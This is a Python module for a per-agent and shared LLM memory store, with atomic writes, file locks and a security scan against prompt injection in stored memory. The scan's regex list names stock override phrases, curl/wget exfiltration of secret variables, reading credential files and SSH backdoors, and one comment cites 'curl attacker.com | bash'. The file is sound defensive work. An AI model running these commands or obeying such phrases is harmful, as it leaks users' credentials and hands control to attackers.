"""Bounded, file-backed curated memory — the short-horizon layer.

Adapted from the Hermes agent (github.com/nousresearch/hermes-agent,
tools/memory_tool.py) with two changes for our multi-agent setup:

1. ``MEMORY.md`` is **per-agent** (lives under the agent's own workspace
   at ``workspaces/<role>/memories/MEMORY.md``) so the trader, analyst,
   risk-manager, etc. each curate their own notes.
2. ``USER.md`` is **shared** across all agents at ``workspaces/user.md``
   so user preferences set in one agent session are visible to every
   other agent. One profile, many roles.

Everything else is faithful to the Hermes design because that design is
good: bounded character limits (model-independent), frozen system-prompt
snapshot at session start so the LLM prefix cache is stable, live
tool-facing state for mid-session CRUD, atomic writes via temp + rename,
file locks for concurrent sessions, substring matching for replace and
remove so the LLM doesn't have to echo the full entry back, exact
duplicate rejection, and a security scan that refuses to persist
anything that looks like a prompt-injection or exfiltration payload.

Char limits are higher than Hermes's defaults because our LLM endpoints
have larger context windows — see ``config.MEMORY_CHAR_LIMIT`` and
``config.USER_CHAR_LIMIT``.
"""

from __future__ import annotations

import fcntl
import logging
import os
import re
import tempfile
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


# ── Entry delimiter ──────────────────────────────────────────
#
# Individual memory entries are separated by a single section-sign
# character on its own line. Chosen because "§" is extremely unlikely
# to appear inside a real memory entry, survives YAML / JSON / markdown
# round-tripping, and is visually distinct when a human opens the file.

ENTRY_DELIMITER = "\n§\n"


# ── Security scan ────────────────────────────────────────────
#
# Memory content ends up injected verbatim into the LLM's system
# prompt. That makes it a privileged surface — anything that lands in
# MEMORY.md runs with the agent's full authority next session. Even
# without a malicious user, an agent that indiscriminately saves every
# snippet it sees is one `curl attacker.com | bash` suggestion away
# from persisting an instruction to do that on every session start.
#
# These regexes cover the obvious categories: prompt injection,
# credential exfiltration, SSH backdoors, and shell-rc persistence.
# The list is intentionally short and tight rather than exhaustive —
# a long regex list would produce false positives and train the LLM
# to work around them. Pair this with human review of MEMORY.md as
# the actual safety net.

_MEMORY_THREAT_PATTERNS: list[tuple[str, str]] = [
    # Prompt injection
    (r"ignore\s+(previous|all|above|prior)\s+instructions", "prompt_injection"),
    (r"you\s+are\s+now\s+", "role_hijack"),
    (r"do\s+not\s+tell\s+the\s+user", "deception_hide"),
    (r"system\s+prompt\s+override", "sys_prompt_override"),
    (
        r"disregard\s+(your|all|any)\s+(instructions|rules|guidelines)",
        "disregard_rules",
    ),
    (
        r"act\s+as\s+(if|though)\s+you\s+(have\s+no|don't\s+have)\s+(restrictions|limits|rules)",
        "bypass_restrictions",
    ),
    # Exfiltration via curl/wget with secrets
    (r"curl\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)", "exfil_curl"),
    (r"wget\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)", "exfil_wget"),
    (
        r"cat\s+[^\n]*(\.env|credentials|\.netrc|\.pgpass|\.npmrc|\.pypirc)",
        "read_secrets",
    ),
    # Persistence via shell rc / ssh
    (r"authorized_keys", "ssh_backdoor"),
    (r"\$HOME/\.ssh|~/\.ssh", "ssh_access"),
]

# Invisible unicode that can hide injected instructions inside a
# normal-looking sentence. BiDi overrides plus zero-width joiners.
_INVISIBLE_CHARS: set[str] = {
    "\u200b",  # zero-width space
    "\u200c",  # zero-width non-joiner
    "\u200d",  # zero-width joiner
    "\u2060",  # word joiner
    "\ufeff",  # BOM
    "\u202a",  # LRE
    "\u202b",  # RLE
    "\u202c",  # PDF
    "\u202d",  # LRO
    "\u202e",  # RLO
}


def _scan_memory_content(content: str) -> Optional[str]:
    """Scan content for injection or exfiltration patterns.

    Returns a human-readable error string if the content should be
    blocked, or ``None`` if it passes. Called before every add or
    replace — never trust an in-process agent not to carelessly
    persist something a user or web search asked it to.
    """
    for char in _INVISIBLE_CHARS:
        if char in content:
            return (
                f"Blocked: content contains invisible unicode character "
                f"U+{ord(char):04X} (possible injection)."
            )
    for pattern, pid in _MEMORY_THREAT_PATTERNS:
        if re.search(pattern, content, re.IGNORECASE):
            return (
                f"Blocked: content matches threat pattern '{pid}'. Memory "
                "entries are injected into the system prompt and must not "
                "contain injection or exfiltration payloads."
            )
    return None


# ── MemoryStore ──────────────────────────────────────────────


class MemoryStore:
    """Bounded curated memory with file persistence.

    One instance per agent — each ``AgentRunner`` / ``SubAgent`` creates
    its own store pointing at its own ``MEMORY.md``. The ``USER.md``
    path is passed in from the caller and is typically shared across
    every agent in the process (``workspaces/user.md``).

    The store maintains **two parallel states** that are intentionally
    decoupled:

    * ``_system_prompt_snapshot`` — captured once at ``load_from_disk()``
      time and never mutated mid-session. This is what gets injected
      into the LLM system prompt so the prefix cache stays stable all
      session long. Nobody mutates it until the next session starts.
    * ``memory_entries`` / ``user_entries`` — the live state that the
      ``memory`` tool operates on. Every mutation is persisted to disk
      immediately so a crash can't lose writes, and tool responses
      always echo this live state so the LLM can see the current
      usage percentage + list of entries.

    The gap between the two is deliberate: **the LLM never sees a
    changed system prompt mid-session.** If it adds an entry at turn 5,
    the add succeeds, the file is updated, the tool response confirms
    the entry and shows the new total — but the system prompt block
    still reflects the state at session start. The new entry will only
    appear in the system prompt the next time the agent is instantiated.
    This is a performance trade: re-computing the prompt every turn
    burns the prefix cache and is ~10× slower.
    """

    def __init__(
        self,
        memory_path: Path,
        user_path: Path,
        memory_char_limit: int,
        user_char_limit: int,
    ) -> None:
        """Initialize the store with explicit paths and char limits.

        Args:
            memory_path: Absolute path to this agent's ``MEMORY.md``.
            user_path: Absolute path to the shared ``USER.md``.
            memory_char_limit: Max chars in the agent notes file.
            user_char_limit: Max chars in the shared user profile.
        """
        self.memory_path = Path(memory_path)
        self.user_path = Path(user_path)
        self.memory_char_limit = int(memory_char_limit)
        self.user_char_limit = int(user_char_limit)

        self.memory_entries: List[str] = []
        self.user_entries: List[str] = []

        # Frozen snapshot for system-prompt injection. Set once at
        # ``load_from_disk()`` and never touched again by mutations.
        self._system_prompt_snapshot: Dict[str, str] = {"memory": "", "user": ""}

    # ── Loading ─────────────────────────────────────────────

    def load_from_disk(self) -> None:
        """Read both files, dedupe, capture the frozen snapshot."""
        self.memory_path.parent.mkdir(parents=True, exist_ok=True)
        self.user_path.parent.mkdir(parents=True, exist_ok=True)

        self.memory_entries = self._read_file(self.memory_path)
        self.user_entries = self._read_file(self.user_path)

        # ``dict.fromkeys`` preserves insertion order while dropping
        # exact duplicates. Matches Hermes's behavior.
        self.memory_entries = list(dict.fromkeys(self.memory_entries))
        self.user_entries = list(dict.fromkeys(self.user_entries))

        self._system_prompt_snapshot = {
            "memory": self._render_block("memory", self.memory_entries),
            "user": self._render_block("user", self.user_entries),
        }

    # ── File helpers ────────────────────────────────────────

    @staticmethod
    @contextmanager
    def _file_lock(path: Path):
        """Acquire an exclusive file lock via a sidecar .lock file.

        We lock a separate file rather than the memory file itself so
        atomic rename (``os.replace``) can swap the memory file
        underneath the lock. Concurrent readers never see a partially
        written file because they read the old inode until the rename.
        """
        lock_path = path.with_suffix(path.suffix + ".lock")
        lock_path.parent.mkdir(parents=True, exist_ok=True)
        fd = open(lock_path, "w")
        try:
            fcntl.flock(fd, fcntl.LOCK_EX)
            yield
        finally:
            fcntl.flock(fd, fcntl.LOCK_UN)
            fd.close()

    @staticmethod
    def _read_file(path: Path) -> List[str]:
        """Read a memory file and split it into entries.

        No file lock needed on the read side: writes are atomic via
        rename, so a reader always sees either the previous complete
        file or the new complete file. Split on the full delimiter
        (``\n§\n``) rather than the bare ``§`` character so entries
        that happen to contain the section sign aren't corrupted.
        """
        if not path.exists():
            return []
        try:
            raw = path.read_text(encoding="utf-8")
        except OSError:
            return []
        if not raw.strip():
            return []
        entries = [e.strip() for e in raw.split(ENTRY_DELIMITER)]
        return [e for e in entries if e]

    @staticmethod
    def _write_file(path: Path, entries: List[str]) -> None:
        """Atomic write via ``tempfile.mkstemp`` + ``os.replace``.

        The temp file is created in the same directory (same
        filesystem) so the rename is atomic. Opening the destination
        with ``"w"`` would truncate-then-fill, which leaves a window
        where concurrent readers see an empty file — we don't want
        that for a file that gets injected into the system prompt.
        """
        content = ENTRY_DELIMITER.join(entries) if entries else ""
        path.parent.mkdir(parents=True, exist_ok=True)
        fd, tmp_path = tempfile.mkstemp(
            dir=str(path.parent), suffix=".tmp", prefix=".mem_"
        )
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                f.write(content)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp_path, str(path))
        except BaseException:
            # Clean up the temp file on any failure so we don't
            # leak .mem_XXXXXX files in the memories dir.
            try:
                os.unlink(tmp_path)
            except OSError:
                pass
            raise

    # ── Target resolution ───────────────────────────────────

    def _path_for(self, target: str) -> Path:
        return self.user_path if target == "user" else self.memory_path

    def _entries_for(self, target: str) -> List[str]:
        return self.user_entries if target == "user" else self.memory_entries

    def _set_entries(self, target: str, entries: List[str]) -> None:
        if target == "user":
            self.user_entries = entries
        else:
            self.memory_entries = entries

    def _char_limit(self, target: str) -> int:
        return self.user_char_limit if target == "user" else self.memory_char_limit

    def _char_count(self, target: str) -> int:
        entries = self._entries_for(target)
        if not entries:
            return 0
        return len(ENTRY_DELIMITER.join(entries))

    def _reload_target(self, target: str) -> None:
        """Re-read entries from disk, under the file lock.

        Called before every mutation so two concurrent sessions can't
        clobber each other — whoever gets the lock second picks up
        what the first one wrote, then applies its own change on top.
        """
        fresh = self._read_file(self._path_for(target))
        self._set_entries(target, list(dict.fromkeys(fresh)))

    def _save_target(self, target: str) -> None:
        self._write_file(self._path_for(target), self._entries_for(target))

    # ── Mutations ───────────────────────────────────────────

    def add(self, target: str, content: str) -> Dict[str, Any]:
        """Append a new entry. Rejects empty, duplicates, over-limit."""
        content = content.strip()
        if not content:
            return {"success": False, "error": "Content cannot be empty."}

        scan_error = _scan_memory_content(content)
        if scan_error:
            return {"success": False, "error": scan_error}

        with self._file_lock(self._path_for(target)):
            self._reload_target(target)
            entries = self._entries_for(target)
            limit = self._char_limit(target)

            if content in entries:
                return self._success_response(
                    target, "Entry already exists (no duplicate added)."
                )

            new_entries = entries + [content]
            new_total = len(ENTRY_DELIMITER.join(new_entries))
            if new_total > limit:
                current = self._char_count(target)
                return {
                    "success": False,
                    "error": (
                        f"Memory at {current:,}/{limit:,} chars. Adding this "
                        f"entry ({len(content)} chars) would exceed the limit. "
                        "Replace or remove existing entries first."
                    ),
                    "current_entries": entries,
                    "usage": f"{current:,}/{limit:,}",
                }

            entries.append(content)
            self._set_entries(target, entries)
            self._save_target(target)

        return self._success_response(target, "Entry added.")

    def replace(self, target: str, old_text: str, new_content: str) -> Dict[str, Any]:
        """Replace an entry identified by substring match.

        ``old_text`` just needs to be a unique substring of the target
        entry — the LLM doesn't have to echo the full text back. If
        the substring matches multiple distinct entries we return an
        error with previews so the LLM can pick a more specific match.
        """
        old_text = old_text.strip()
        new_content = new_content.strip()
        if not old_text:
            return {"success": False, "error": "old_text cannot be empty."}
        if not new_content:
            return {
                "success": False,
                "error": "new_content cannot be empty. Use 'remove' to delete entries.",
            }

        scan_error = _scan_memory_content(new_content)
        if scan_error:
            return {"success": False, "error": scan_error}

        with self._file_lock(self._path_for(target)):
            self._reload_target(target)
            entries = self._entries_for(target)
            matches = [(i, e) for i, e in enumerate(entries) if old_text in e]

            if not matches:
                return {"success": False, "error": f"No entry matched '{old_text}'."}

            if len(matches) > 1:
                # Multiple matches are only ambiguous if they're
                # *distinct* entries. Identical duplicates would have
                # been dedup'd on read, but belt-and-braces: if they
                # somehow slipped through we act on the first one.
                unique = {e for _, e in matches}
                if len(unique) > 1:
                    previews = [
                        e[:80] + ("..." if len(e) > 80 else "") for _, e in matches
                    ]
                    return {
                        "success": False,
                        "error": f"Multiple entries matched '{old_text}'. Be more specific.",
                        "matches": previews,
                    }

            idx = matches[0][0]
            limit = self._char_limit(target)
            probe = entries.copy()
            probe[idx] = new_content
            new_total = len(ENTRY_DELIMITER.join(probe))
            if new_total > limit:
                return {
                    "success": False,
                    "error": (
                        f"Replacement would put memory at {new_total:,}/{limit:,} "
                        "chars. Shorten the new content or remove other entries first."
                    ),
                }

            entries[idx] = new_content
            self._set_entries(target, entries)
            self._save_target(target)

        return self._success_response(target, "Entry replaced.")

    def remove(self, target: str, old_text: str) -> Dict[str, Any]:
        """Remove an entry identified by substring match."""
        old_text = old_text.strip()
        if not old_text:
            return {"success": False, "error": "old_text cannot be empty."}

        with self._file_lock(self._path_for(target)):
            self._reload_target(target)
            entries = self._entries_for(target)
            matches = [(i, e) for i, e in enumerate(entries) if old_text in e]

            if not matches:
                return {"success": False, "error": f"No entry matched '{old_text}'."}

            if len(matches) > 1:
                unique = {e for _, e in matches}
                if len(unique) > 1:
                    previews = [
                        e[:80] + ("..." if len(e) > 80 else "") for _, e in matches
                    ]
                    return {
                        "success": False,
                        "error": f"Multiple entries matched '{old_text}'. Be more specific.",
                        "matches": previews,
                    }

            idx = matches[0][0]
            entries.pop(idx)
            self._set_entries(target, entries)
            self._save_target(target)

        return self._success_response(target, "Entry removed.")

    # ── System prompt injection ────────────────────────────

    def format_for_system_prompt(self, target: str) -> Optional[str]:
        """Return the frozen snapshot text, or ``None`` if empty.

        This is what the agent's system prompt sees. It reflects the
        state at ``load_from_disk()`` time, not the live state, on
        purpose (see class docstring for the rationale).
        """
        block = self._system_prompt_snapshot.get(target, "")
        return block or None

    # ── Success responses + rendering ──────────────────────

    def _success_response(self, target: str, message: str = "") -> Dict[str, Any]:
        entries = self._entries_for(target)
        current = self._char_count(target)
        limit = self._char_limit(target)
        pct = min(100, int((current / limit) * 100)) if limit > 0 else 0
        resp: Dict[str, Any] = {
            "success": True,
            "target": target,
            "entries": entries,
            "usage": f"{pct}% — {current:,}/{limit:,} chars",
            "entry_count": len(entries),
        }
        if message:
            resp["message"] = message
        return resp

    def _render_block(self, target: str, entries: List[str]) -> str:
        """Render a system-prompt block for the given target.

        Returns empty string when there are no entries so the caller
        can skip the section entirely rather than inject a header with
        no content.
        """
        if not entries:
            return ""
        limit = self._char_limit(target)
        content = ENTRY_DELIMITER.join(entries)
        current = len(content)
        pct = min(100, int((current / limit) * 100)) if limit > 0 else 0
        if target == "user":
            header = f"USER PROFILE (who the user is) [{pct}% — {current:,}/{limit:,} chars]"
        else:
            header = f"MEMORY (your personal notes) [{pct}% — {current:,}/{limit:,} chars]"
        separator = "═" * 46
        return f"{separator}\n{header}\n{separator}\n{content}"
